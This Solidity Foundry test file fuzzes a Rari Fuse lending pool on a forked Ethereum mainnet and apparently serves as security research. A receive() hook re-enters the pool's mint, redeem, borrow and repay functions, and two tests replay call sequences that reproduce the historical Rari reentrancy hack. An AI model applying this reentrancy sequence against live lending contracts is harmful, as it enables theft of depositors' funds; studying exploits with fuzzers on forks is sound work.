// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import "src/interfaces/IUSDC.sol";
import "src/interfaces/IcEther.sol";
import "src/interfaces/ICErc20.sol";
import "src/interfaces/IComptroller.sol";
import "src/interfaces/IRariMasterPriceOracle.sol";

contract RariAddresses {
    IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IcEther fEth = IcEther(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));
    ICErc20 fUsdc = ICErc20(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    IComptroller comptroller =
        IComptroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
    IRariMasterPriceOracle oracle =
        IRariMasterPriceOracle(0xe980EFB504269FF53F7F4BC92a2Bd1e31B43f632);
}

contract TestAccount {
    RariFuzzHandler handler;

    function setHandler(RariFuzzHandler _handler) public {
        handler = _handler;
    }

    receive() external payable {
        if (msg.sender == address(handler)) {
            return;
        }

        handler.performCallback();
    }
}

contract RariFuzzHandler is RariAddresses, Test {
    address public ACCOUNT1;

    bool internal enabled;
    uint8 internal callback;
    uint256 internal uint0;

    constructor(address account1) {
        ACCOUNT1 = account1;
    }

    function mint(uint256 amount) public {
        amount = amount % (usdc.balanceOf(ACCOUNT1) + 1);

        vm.prank(ACCOUNT1);
        uint256 error = fUsdc.mint(amount);
    }

    function redeem(uint256 amount) public {
        uint256 underlyingBalance = fUsdc.balanceOfUnderlying(ACCOUNT1);
        amount = amount % (underlyingBalance + 1);

        vm.prank(ACCOUNT1);
        fUsdc.redeemUnderlying(amount);
    }

    function borrow(uint256 amount) public {
        address[] memory ctokens = new address[](1);
        ctokens[0] = address(fUsdc);
        vm.prank(ACCOUNT1);
        comptroller.enterMarkets(ctokens);

        (uint256 error, uint256 liquidity, uint256 shortfall) = comptroller
            .getAccountLiquidity(ACCOUNT1);
        amount = amount % (liquidity + 1);

        vm.prank(ACCOUNT1);
        fEth.borrow(amount);
    }

    function repay(uint256 amount) public {
        uint256 borrowed = fEth.borrowBalanceCurrent(ACCOUNT1);
        amount = amount % (borrowed + 1);

        vm.prank(ACCOUNT1);
        fEth.repayBorrow{value: amount}();
    }

    function exitMarket() public {
        vm.prank(ACCOUNT1);
        comptroller.exitMarket(address(fUsdc));
    }

    function accrueInterest() public {
        fUsdc.accrueInterest();
        fEth.accrueInterest();
    }

    /// REENTRANCY
    function updateReentrancy(
        bool _enabled,
        uint8 _callback,
        uint256 _uint0
    ) public {
        enabled = _enabled;
        callback = _callback;
        uint0 = _uint0;
    }

    function setReentrancyEnabled(bool _enabled) public {
        enabled = _enabled;
    }

    function setReentrancyCallback(uint8 _callback) public {
        callback = _callback;
    }

    function setReentrancyUint0(uint256 _uint0) public {
        uint0 = _uint0;
    }

    function performCallback() public {
        if (!enabled) return;

        uint256 functionId = (callback % 6) + 1;

        if (functionId == 1) {
            mint(uint0);
        } else if (functionId == 2) {
            redeem(uint0);
        } else if (functionId == 3) {
            borrow(uint0);
        } else if (functionId == 4) {
            repay(uint0);
        } else if (functionId == 5) {
            exitMarket();
        } else if (functionId == 6) {
            accrueInterest();
        }
    }

    function getAccountBalance(address account)
        public
        view
        returns (uint256 value)
    {
        uint256 ethDecimals = 18;
        uint256 usdcDecimals = 6;

        uint256 ethBalance = account.balance;
        uint256 usdcBalance = usdc.balanceOf(account);

        uint256 ethPrice = 1 ether;
        uint256 usdcPrice = oracle.price(address(usdc));

        uint256 ethValue = (ethBalance * ethPrice) / (10**ethDecimals);
        uint256 usdcValue = (usdcBalance * usdcPrice) / (10**usdcDecimals);

        value = ethValue + usdcValue;
    }
}

contract RariTest is RariAddresses, Test {
    int256 constant PROFIT_TARGET = 1 ether;

    uint256 constant STARTING_TOKEN_BALANCE = 1_000_000_000e6;
    uint256 constant STARTING_ETH_BALANCE = 1000 ether;

    uint256 account1InitialBalance;

    RariFuzzHandler handler;
    TestAccount account1;

    function setUp() public {
        vm.createSelectFork("mainnet", 14684813);

        account1 = new TestAccount();
        vm.label(address(account1), "Account1");

        handler = new RariFuzzHandler(address(account1));

        account1.setHandler(handler);

        vm.deal(address(account1), STARTING_ETH_BALANCE);
        deal(address(usdc), address(account1), STARTING_TOKEN_BALANCE);

        vm.prank(address(account1));
        usdc.approve(address(fUsdc), type(uint256).max);

        account1InitialBalance = handler.getAccountBalance(address(account1));

        targetContract(address(handler));
    }

    function afterInvariant() public {
        handler.exitMarket();
        checkInvariant();
    }

    /// forge-config: default.invariant.runs = 1000
    /// forge-config: default.invariant.depth = 25
    function invariant_test_profit() public {
        checkInvariant();
    }

    function checkInvariant() private {
        int256 account1Profit = int256(
            handler.getAccountBalance(address(account1))
        ) - int256(account1InitialBalance);

        vm.writeLine(
            "logFile.txt",
            string.concat("account1Profit:::", vm.toString(account1Profit))
        );
        require(account1Profit <= PROFIT_TARGET, "Account1 profit!");
    }

    function testRariHackEchidna() public {
        handler.setReentrancyEnabled(true);
        handler.mint(
            10089325332519370949262917519849428342404732088146691233195543578618300570336
        );
        handler.setReentrancyCallback(4);
        handler.borrow(1164710473815707741);
        handler.redeem(995200615491);
        checkInvariant();
    }

    function testRariHackFoundry() public {
        handler.setReentrancyEnabled(true);
        handler.mint(34480686646904748734687845775862632361229606401142);
        handler.redeem(146819705882536770626717166753626284388);
        handler.redeem(12060);
        handler.redeem(4183609847315272917562030534181);
        handler.redeem(122731788134496338);
        handler.redeem(21265);
        handler.redeem(9343);
        handler.redeem(
            54614006384459053945509674884461949487903176697932797427761530591
        );
        handler.redeem(2212145813418856138753290481425584633259254370);
        handler.setReentrancyCallback(4);
        handler.borrow(4760753135904324988326715789554485535);
        handler.redeem(447649540520714);
        checkInvariant();
    }
}
